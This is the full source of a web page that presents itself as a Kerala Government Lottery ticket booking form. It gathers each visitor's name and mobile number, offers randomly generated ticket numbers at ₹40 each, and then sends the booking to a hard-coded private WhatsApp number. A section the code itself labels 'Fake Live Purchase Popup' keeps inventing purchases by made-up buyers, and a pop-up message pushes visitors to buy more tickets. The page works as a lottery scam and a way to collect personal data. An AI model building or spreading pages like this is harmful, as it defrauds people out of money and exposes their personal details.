<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Kerala Government Lottery</title>

<style>
body{
margin:0;
background:linear-gradient(135deg,#fff0f5,#ffe6f0);
font-family:Arial,sans-serif;
display:flex;
justify-content:center;
padding:5px;
}

.container{
width:100%;
max-width:400px;
background:#fff;
padding:10px;
border-radius:16px;
box-shadow:0 8px 20px rgba(0,0,0,.15);
}

.heroBox{
position:relative;
}

.heroBox img{
width:100%;
border-radius:12px;
max-height:160px;
object-fit:cover;
}

#popup{
position:absolute;
bottom:15px;
left:50%;
transform:translateX(-50%);
width:90%;
background:#fff;
border-radius:12px;
padding:8px;
box-shadow:0 5px 15px rgba(0,0,0,.3);
display:none;
z-index:5;
border-left:4px solid #00c853;
font-size:11px;
animation:fade .3s ease;
}

@keyframes fade{
from{
opacity:0;
transform:translateX(-50%) translateY(10px);
}
to{
opacity:1;
transform:translateX(-50%) translateY(0);
}
}

.urgencyBox{
background:#f8f9fa;
border:1px solid #eee;
padding:8px;
border-radius:10px;
text-align:center;
font-size:13px;
font-weight:bold;
margin:8px 0;
}

.formBox{
background:#fafafa;
padding:8px;
border-radius:12px;
border:1px solid #eee;
margin-bottom:6px;
}

label{
display:block;
font-size:11px;
font-weight:bold;
margin-bottom:3px;
color:#555;
}

input{
width:100%;
padding:10px;
margin-bottom:6px;
border-radius:10px;
border:1px solid #ddd;
font-size:13px;
background:#fff;
box-sizing:border-box;
}

.ticketBox{
border:2px dashed #ff4f79;
border-radius:12px;
padding:8px;
background:#fff7fa;
}

.ticketAmount{
background:#e8f5e9;
color:#1b5e20;
padding:5px;
border-radius:8px;
text-align:center;
font-weight:bold;
margin-bottom:5px;
font-size:13px;
}

select{
width:100%;
height:110px;
padding:8px;
border-radius:10px;
border:1px solid #ddd;
font-size:13px;
}

.tag{
display:inline-block;
padding:5px 8px;
border-radius:20px;
margin:3px;
font-size:11px;
background:#ffd6e0;
color:#c2185b;
}

.submitBtn{
width:100%;
background:linear-gradient(90deg,#00c853,#009624);
color:#fff;
border:none;
font-weight:bold;
cursor:pointer;
font-size:15px;
padding:12px;
border-radius:12px;
margin-top:10px;
}

.submitBtn:disabled{
opacity:.7;
}
</style>
</head>

<body>

<div class="container">

<div class="heroBox">
<img src="https://i.postimg.cc/7L3ZWfQh/Onam_bumper.jpg" loading="lazy">
<div id="popup"></div>
</div>

<div class="urgencyBox">
🎟 Kerala Government Lottery • Book Your Ticket
</div>

<div class="formBox">
<label>👤 Full Name</label>
<input id="name" placeholder="Enter Full Name (Only Letters)">

<label>📱 Mobile Number</label>
<input id="mobile" maxlength="10" placeholder="Enter 10 Digit Mobile Number">
</div>

<div class="ticketBox">

<div class="ticketAmount" id="ticketAmount">
🎟 Select Tickets (₹40 each)
</div>

<select id="ticket" multiple></select>

</div>

<div id="selectedTickets"></div>

<input id="amount" readonly placeholder="Total ₹" style="margin-top:6px;">

<button id="submitBtn" class="submitBtn">
📲 Submit & Continue To WhatsApp
</button>

</div>

<script>

const PRICE = 40;
let WHATSAPP_NUMBER = localStorage.getItem('whatsapp_number') || "919270295839";

const ticket=document.getElementById("ticket");
const amount=document.getElementById("amount");
const ticketAmount=document.getElementById("ticketAmount");
const submitBtn=document.getElementById("submitBtn");
const nameI=document.getElementById("name");
const mobileI=document.getElementById("mobile");
const selectedDiv=document.getElementById("selectedTickets");

// Generate Tickets
for(let i=0;i<200;i++){
let n=("000000"+Math.floor(Math.random()*999999)).slice(-6);
let o=document.createElement("option");
o.value="KL"+n;
o.textContent="KL"+n;
ticket.appendChild(o);
}

function refresh(){
let sel=[...ticket.selectedOptions];
selectedDiv.innerHTML="";
let total=sel.length*PRICE;

if(sel.length>0){
amount.value="₹ "+total;
ticketAmount.textContent="Tickets: "+sel.length+" | Amount: ₹ "+total;
}else{
amount.value="";
ticketAmount.textContent="Select Tickets (₹40 each)";
}

sel.forEach(o=>{
let tag=document.createElement("div");
tag.className="tag";
tag.innerHTML="🎟 "+o.value;
selectedDiv.appendChild(tag);
});
}

ticket.addEventListener("change",refresh);

// Name Input Formatting (Only letters & space allowed while typing)
nameI.addEventListener("input", function(){
nameI.value = nameI.value.replace(/[^a-zA-Z\s]/g, '');
});

// Mobile Input Formatting (Only numbers allowed while typing)
mobileI.addEventListener("input",function(){
mobileI.value = mobileI.value.replace(/[^0-9]/g,'').slice(0,10);
});

// Submit Button Handler
submitBtn.addEventListener("click",function(){

submitBtn.disabled=true;
submitBtn.innerHTML="Please Wait...";

let name=nameI.value.trim();
let mobile=mobileI.value.trim();
let sel=[...ticket.selectedOptions];

// 1. Name Check (Pehle Naam)
let nameRegex = /^[a-zA-Z\s]+$/;
if(!name || !nameRegex.test(name)){
alert("Please enter a valid Name (Only Letters allowed)");
nameI.focus();
submitBtn.disabled=false;
submitBtn.innerHTML="📲 Submit & Continue To WhatsApp";
return;
}

// 2. Mobile Check (Phir Mobile Number)
if(!/^[0-9]{10}$/.test(mobile)){
alert("Enter valid 10 digit mobile number");
mobileI.focus();
submitBtn.disabled=false;
submitBtn.innerHTML="📲 Submit & Continue To WhatsApp";
return;
}

// 3. Ticket Selection Check (Sath me Ticket Check - Minimum 2 needed)
if(sel.length === 0){
alert("Please select at least 2 tickets");
submitBtn.disabled=false;
submitBtn.innerHTML="📲 Submit & Continue To WhatsApp";
return;
}

if(sel.length < 2){
alert("5 Ticket High Winning Chance");
submitBtn.disabled=false;
submitBtn.innerHTML="📲 Submit & Continue To WhatsApp";
return;
}

// Agar 2 ya usse zyada ticket hain, toh WhatsApp open hoga
let total=sel.length*PRICE;
let list=sel.map(o=>o.value).join(", ");

let msg=`New Booking

Name: ${name}
Mobile: ${mobile}

Tickets (${sel.length})
${list}

Total Amount ₹${total}

Please confirm booking`;

WHATSAPP_NUMBER = localStorage.getItem('whatsapp_number') || WHATSAPP_NUMBER;

window.open(
"https://wa.me/" + WHATSAPP_NUMBER +
"?text=" + encodeURIComponent(msg),
"_blank"
);

submitBtn.disabled=false;
submitBtn.innerHTML="📲 Submit & Continue To WhatsApp";

});

// Fake Live Purchase Popup
const names=["Ramesh","Suresh","Anitha","Pooja","Krishna","Divya","Lakshmi"];
const cities=["Bangalore","Chennai","Hyderabad","Kochi","Mysuru"];

function popup(){
let box=document.getElementById("popup");
if(box.style.display=="block") return;

let name=names[Math.floor(Math.random()*names.length)];
let city=cities[Math.floor(Math.random()*cities.length)];
let tickets=Math.floor(Math.random()*10)+4;
let total=tickets*40;

box.innerHTML=`<b>${name}</b> from <b>${city}</b><br>🎟 ${tickets} Tickets booked<br>₹${total} Paid`;
box.style.display="block";

setTimeout(()=>{ box.style.display="none"; },5000);
}

window.onload=function(){ popup(); };
setInterval(()=>{ popup(); },5500);

</script>

</body>
</html>
